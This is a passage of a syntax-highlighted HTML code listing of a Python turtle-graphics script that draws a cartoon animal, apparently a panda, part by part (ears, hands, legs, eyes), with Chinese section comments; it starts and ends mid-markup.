punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment"># 左手内</span></pre></td></tr><tr><td data-num="24"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment"># 轮廓</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># 头顶</span></pre></td></tr><tr><td data-num="38"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"lightgray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token comment"># 左耳</span></pre></td></tr><tr><td data-num="48"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token comment"># 左侧</span></pre></td></tr><tr><td data-num="51"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">320</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment"># 左腿</span></pre></td></tr><tr><td data-num="55"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment"># 右腿</span></pre></td></tr><tr><td data-num="63"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token comment"># 右手</span></pre></td></tr><tr><td data-num="71"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token comment"># 右侧</span></pre></td></tr><tr><td data-num="76"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token comment"># 右耳</span></pre></td></tr><tr><td data-num="79"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token comment"># 右耳内</span></pre></td></tr><tr><td data-num="84"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">210</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment"># 左耳内</span></pre></td></tr><tr><td data-num="98"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="103"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="106"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre></pre></td></tr><tr><td data-num="108"></td><td><pre><span class="token comment"># 右手内</span></pre></td></tr><tr><td data-num="109"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="110"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="113"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="115"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="117"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="118"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="119"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="120"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token comment"># 左腿内</span></pre></td></tr><tr><td data-num="123"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">168</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="127"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="128"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="129"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="130"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="131"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="132"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="133"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="134"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="136"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="137"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="138"></td><td><pre><span class="token comment"># 右腿内</span></pre></td></tr><tr><td data-num="139"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="140"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">210</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="141"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="142"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="143"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="144"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">155</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="145"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="146"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="148"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="149"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="150"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">14</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="152"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="153"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="154"></td><td><pre></pre></td></tr><tr><td data-num="155"></td><td><pre><span class="token comment"># 右眼</span></pre></td></tr><tr><td data-num="156"></td><td><pre><span class="token comment"># 眼圈</span></pre></td></tr><tr><td data-num="157"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="158"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="159"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="160"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="161"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="162"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="163"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="164"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="165"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="166"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="167"></td><td><pre><span class="token comment"># 眼珠</span></pre></td></tr><tr><td data-num="168"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="169"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="170"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="171"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="172"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="173"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="174"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="175"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="176"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="177"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="178"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="179"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="180"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="181"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="182"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="183"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="184"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="185"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="186"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="187"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="188"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="189"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="190"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="191"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="192"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span 